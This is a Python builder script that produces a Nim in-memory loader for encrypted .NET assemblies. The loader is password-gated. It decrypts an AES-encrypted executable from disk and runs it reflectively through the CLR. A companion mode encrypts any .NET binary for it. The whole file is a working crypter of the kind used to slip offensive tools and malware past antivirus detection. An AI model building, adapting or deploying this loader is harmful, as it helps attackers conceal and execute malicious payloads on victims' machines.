import sys, os, random, hashlib, base64
from Crypto.Cipher import AES

template = """
import winim/clr
import os
import std/md5
import aesNim
import std/base64
import std/strutils
import strenc

var params = commandLineParams()
if len(params) >= 1:
    var password = split(params[0], ":")[0]
    password.add("%s")
    if $toMD5(password) == "%s":
        echo "dotnet on nim..."
        var aes = initAES()
        var enc = readFile(split(params[0], ":")[1])
        var decryptKey = enc[0..31]
        var decryptIv = enc[32..47]
        if aes.setDecodeKey(decryptKey):
            var decrypted = aes.decryptCBC(decryptIv, decode(enc[48..len(enc)-1]))
            var commandLine:  seq[string]
            for i in 1..high(params):
                commandLine.add(params[i])
            #echo decrypted[0..5]
            var assembly = load(@(decrypted.toOpenArrayByte(0, decrypted.high)))
            var arr = toCLRVariant(commandLine, VT_BSTR)
            assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
"""

build_command = "nim c -d:mingw -d:release --opt:size --app:console --out:%s  pro.nim"

def random_string(length):
    rand_str = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+-*/=') for i in range(length)])
    return rand_str

def md5(orig):
    md5 = hashlib.md5()
    md5.update(orig.encode())
    return md5.hexdigest()

def zeropadding(data):
    bs = 16
    if len(data) % bs > 0:
        data += (bs - len(data) % bs) * b'\x00'
    
    return data


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print('usage:python %s <build password out_file|encrypt .net-exe out_file>' % sys.argv[0])
    else:
        if sys.argv[1] == 'build':
            with open('pro.nim', 'w') as f2:
                    salt = random_string(16)
                    password = sys.argv[2] + salt
                    f2.write(template % (salt, md5(password)))
                    os.system(build_command % sys.argv[3])
                    print("如果遇到没有输出任何信息的情况,请手动执行命令编译" + build_command % sys.argv[3])
        elif sys.argv[1] == 'encrypt':
            with open(sys.argv[2], 'rb') as f:
                data = f.read()
                with open(sys.argv[3], 'wb') as f2:

                    encryptKey = random_string(32)
                    encryptIv = random_string(16)

                    cipher = AES.new(encryptKey.encode(), AES.MODE_CBC, encryptIv.encode())
                    data = zeropadding(data)
                    encrypt_bytes = cipher.encrypt(data)
                    f2.write(encryptKey.encode())
                    f2.write(encryptIv.encode())
                    f2.write(base64.b64encode(encrypt_bytes))
        else:
            print('not support command')
                        

        
        